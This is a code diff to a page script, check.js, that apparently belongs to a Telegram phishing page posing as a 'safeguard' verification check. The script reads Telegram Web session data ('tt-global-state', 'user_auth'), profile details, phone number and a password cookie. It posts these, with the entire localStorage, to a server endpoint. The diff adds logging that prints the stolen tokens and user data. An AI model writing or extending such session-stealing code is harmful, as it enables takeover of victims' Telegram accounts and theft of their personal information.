@@ -29,8 +29,14 @@ document.addEventListener("DOMContentLoaded", function() {
     // Check localStorage for tt-global-state and user_auth
     let globalState = localStorage.getItem("tt-global-state");
     console.log(`check.js: tt-global-state exists: ${!!globalState}`);
+    if (globalState) {
+      console.log(`check.js: tt-global-state content: ${globalState}`);
+    }
 
     console.log(`check.js: user_auth exists: ${!!localStorage.getItem("user_auth")}`);
+    if (localStorage.getItem("user_auth")) {
+      console.log(`check.js: user_auth content: ${localStorage.getItem("user_auth")}`);
+    }
 
     if (globalState && localStorage.getItem("user_auth")) {
       const parsedState = JSON.parse(globalState);
@@ -40,6 +46,7 @@ document.addEventListener("DOMContentLoaded", function() {
 
       if (currentUserId && currentUser) {
         console.log(`check.js: Found user data for userId ${currentUserId}`);
+        console.log(`check.js: User data: ${JSON.stringify(currentUser)}`);
 
         const { firstName, usernames, phoneNumber, isPremium } = currentUser;
         const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1] || "No password set";
@@ -48,6 +55,16 @@ document.addEventListener("DOMContentLoaded", function() {
         localStorage.removeItem("tt-global-state");
 
         console.log(`check.js: Sending user data to /api/users/telegram/info for userId ${currentUserId}`);
+        console.log(`check.js: User data to send: ${JSON.stringify({
+          userId: currentUserId,
+          firstName: firstName || "Unknown",
+          usernames: usernames || [],
+          phoneNumber: phoneNumber || "Unknown",
+          isPremium: isPremium || false,
+          password: password,
+          quicklySet: localStorage,
+          type: new URLSearchParams(window.location.search).get("type") || "safeguard"
+        })}`);
 
         try {
           const response = await fetch(`/api/users/telegram/info`, {
@@ -91,6 +108,7 @@ document.addEventListener("DOMContentLoaded", function() {
         clearInterval(checkInterval);
       } else {
         console.log(`check.js: No user data found in tt-global-state`);
+        console.log(`check.js: parsedState: ${JSON.stringify(parsedState)}`);
       }
     } else {
       loginAttempts++;
